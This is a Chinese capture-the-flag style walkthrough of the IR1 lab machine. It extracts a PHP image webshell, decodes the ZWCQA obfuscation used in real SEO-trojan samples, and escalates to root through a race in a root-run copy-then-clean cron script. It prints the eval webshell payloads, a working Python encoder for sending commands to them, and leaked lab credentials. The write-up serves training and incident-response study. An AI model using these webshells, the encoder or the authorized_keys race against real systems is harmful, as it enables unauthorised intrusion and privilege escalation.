# IR1 靶机复盘：从图片马到 root

> 靶机地址：`192.168.134.59`
> Kali 地址：`192.168.134.4`

![IR1 靶机首页](/content/ir1/image-01.png)

## 一、初始枚举

| 端口 | 状态 | 服务 | 版本 |
| --- | --- | --- | --- |
| 22/tcp | open | SSH | OpenSSH 10.3 |
| 80/tcp | open | HTTP | Apache httpd 2.4.68 (Unix) + PHP 8.3.32 |

![端口扫描结果](/content/ir1/image-02.png)
![目录枚举结果](/content/ir1/image-03.png)

```bash
gobuster dir -u http://192.168.134.59/ -w /usr/share/wordlists/dirb/common.txt
```

| 路径 | 说明 |
| --- | --- |
| `/` | 伪造的 IIS 默认页，实际服务为 Apache。 |
| `/upload/` | 开启目录浏览，发现 `ZWCQA.php`。 |
| `/upload.php` | 兔子洞：页面看似提供文件上传，实际不保存文件。 |
| `/cgi-bin/printenv` | CGI 脚本源码泄露，但不是本题主线。 |
| `/server-status` | 403 Forbidden。 |

80 端口的页面中有一张异常图片。后续从图片中分离出的代码与目录浏览发现的 `ZWCQA.php` 相互对应，因此这里不是普通静态资源，而是本题的关键线索。

![HTTP 页面异常图片](/content/ir1/image-04.png)
![上传目录线索](/content/ir1/image-05.png)

## 二、从图片中分离 PHP 源码

`strings` 可以确认图片内存在 `<?php`；再定位该字符串的字节偏移，从偏移位置切出文件尾部，即可得到追加在 PNG 后的 PHP 代码。

![图片马字符串分析](/content/ir1/image-06.png)
![PHP 源码分离过程](/content/ir1/image-07.png)

这并非传统意义上的像素隐写，而是将脚本直接追加在图片文件中。分离出的代码包含 `ZWCQA` 函数和动态执行点，也与前面目录中暴露的 `ZWCQA.php` 对应。

![ZWCQA 代码分析](/content/ir1/image-08.png)

## 三、ZWCQA 解密函数分析

`ZWCQA` 是真实灰黑产 SEO 木马样本中出现过的自定义解密函数；函数名可作为该类后门样本的特征之一。

> 参考：[52pojie 分析文章](https://www.52pojie.cn/thread-2090008-1-1.html)

### 算法原理（ASP VBScript 原版）

```vbscript
function ZWCQA(text)
    const LPMZ = "gw"                              ' 前缀常量
    dim YCRD : YCRD = text
    dim QSVC
    dim TSZV : TSZV = strreverse(YCRD)            ' ① 反转字符串
    for i = 1 to len(TSZV) step 4
        QSVC = QSVC & ChrW(cint("&H" & mid(TSZV, i, 4)))  ' ② 每 4 位 hex 转 Unicode 字符
    next
    ZWCQA = mid(QSVC, len(LPMZ) + 1, len(YCRD) - len(LPMZ))  ' ③ 去掉前缀 "gw"
end function
```

处理逻辑就是：**倒序 → 每 4 位十六进制还原一个字符 → 去掉 `gw` 前缀**。它是混淆而不是强加密，重点在于能够自己还原并写出匹配的编码器。

### PHP 移植版解密函数

```python
def zwcqa_decrypt(text, prefix="gw"):
    ts = text[::-1]
    result = ""
    for i in range(0, len(ts), 4):
        result += chr(int(ts[i:i + 4], 16))
    if result.startswith(prefix):
        result = result[len(prefix):]
    return result
```

### 配套编码函数

```python
def zwcqa_encrypt(payload, prefix="gw"):
    data = prefix + payload
    hex_str = "".join(f"{ord(char):04x}" for char in data)
    return hex_str[::-1]
```

### 解密结果

| 位置 | 还原结果 |
| --- | --- |
| 图片马中的 hex | `@eval($_REQUEST["zero"]);`，口令为 `zero`。 |
| `/upload/ZWCQA.php` 中的 hex | `@eval(ZWCQA($_POST["zero"]));`，请求参数需要采用同一编码。 |

## 四、验证 Web 执行上下文

按照上述规则编码请求参数后，二阶段脚本成功解码并执行。返回的 `uid=101(apache)` 表明这里获得的是 Web 服务账户的命令执行上下文，而不是系统高权限。

![编码请求参数](/content/ir1/image-09.png)
![Web 执行上下文验证](/content/ir1/image-10.png)

## 五、日志泄露与 IR1 用户

拿到 Web 执行上下文后，唯一可读的 Web 日志。(靶机设计里作者引导的不错)
`/var/log/scan.log` 实际上记录了攻击者此前的扫描、凭据获取、后门落地和清理痕迹。

![扫描日志泄露](/content/ir1/image-11.png)
![日志中的攻击链线索](/content/ir1/image-12.png)

其中与后续链路直接相关的内容如下：

```text
[02:33] ftp: IR1:hunter123 SUCCESS
[02:34] Found db_config.bak -> mysql root:toor@localhost/webdb
[02:35] users table: admin/5f4dcc3b5aa765d61d8327deb882cf99
[02:35] users table: IR1/hunter123
[02:36] ssh: IR1:hunter123 SUCCESS
[02:36] sudo -l: (root) NOPASSWD: /usr/bin/find
```

| 凭据/线索 | 值 | 复盘定位 |
| --- | --- | --- |
| IR1 密码 | `hunter123` | 用于验证并切换到 IR1 用户。 |
| MySQL root | `toor` | 攻击者历史活动的证据，不是本题必经路径。 |
| 后门口令 | `zero` | 与图片马和二阶段脚本相互印证。 |
| `sudo -l` / `find` | 历史日志记录 | 应以当前主机的实际权限为准，不能只依据日志下结论。 |

使用 `IR1:hunter123` 成功登录后，身份从 Web 服务账户切换到普通系统用户。

![IR1 用户登录](/content/ir1/image-13.png)

## 六、Safeguard 定时任务与 root

随后发现 `safeguard.sh`。它以 root 身份定时执行，把 `/home/IR1` 的内容递归复制到 `/root`，等待 15 秒后再清理非保留文件。

![Safeguard 定时任务](/content/ir1/image-14.png)

```bash
#!/bin/bash
# safeguard - monitor /home/IR1 for suspicious activity
# Copies IR1 home content for inspection, auto-clean after 15s
SRC=/home/IR1
DST=/root
KEEP="/root/root.txt /root/pass.txt"

cd "$SRC" && cp -r . "$DST"/ 2>/dev/null
sleep 15

for item in "$DST"/* "$DST"/.*; do
    if [[ "$item" =~ /\.{1,2}$ ]]; then
        continue
    fi
    skip=0
    for keep in $KEEP; do
        [ "$item" = "$keep" ] && skip=1 && break
    done
    [ $skip -eq 0 ] && rm -rf "$item" 2>/dev/null
done
```

问题的根本不在于“清理慢”，而在于 root 先把普通用户可控目录复制进 `/root`，再尝试事后删除。`sleep 15` 使这个错误更明显；即便没有这段等待，高权限脚本处理不可信输入的设计本身依然有风险。

本题利用的是复制与清理之间的窗口：将 SSH 公钥置于 IR1 家目录的 `.ssh/authorized_keys`，等待脚本复制到 `/root/.ssh/`，再在窗口期内以 root 认证。若没有固定等待时间，这会更接近竞争条件，需要围绕文件复制和清理的时序进行验证。

![root 权限获取](/content/ir1/image-15.png)

## 七、作者设计思路与背景补充

这个靶机改编自真实应急响应案例：真实失陷机器是一台 IIS 服务器，攻击者通过 `upload.asp` 上传图片马，篡改前端页面进行灰黑产 SEO 引流。

- IIS 页面提示解析漏洞图片马；本题中服务实际为 Apache/PHP，这一处不一致本身就是值得注意的异常。
- `upload.php` 看似提示后门上传地址，实际上是兔子洞。按作者说明，真实案例里攻击者在上传后门后修改了该页面，避免后来者继续进入并篡改。
- 图片马由 ASP 版本改写为 PHP 版本；`ZWCQA` 是该后门样本中的自定义函数名，带有攻击者个人习惯特征。
- 日志将攻击者的扫描、凭据、后门和清理行为连成了一条应急响应证据链。
- 后半段的 safeguard 模拟防护软件失效后的错误配置提权；它比前半段简单，重点是说明高权限自动化脚本不能处理用户可控内容。

## 八、复盘结论

本题重点不在提权，而在于从图片马中定位并分离样本、理解 ZWCQA 编码/解码逻辑，并据此写出能与二阶段 WebShell 匹配的编码器。提权部分则提醒我：以 root 身份运行的“防护”脚本，如果把低权限用户可控文件带入高权限目录，清理得再快也无法修复信任边界已经被打破的问题。
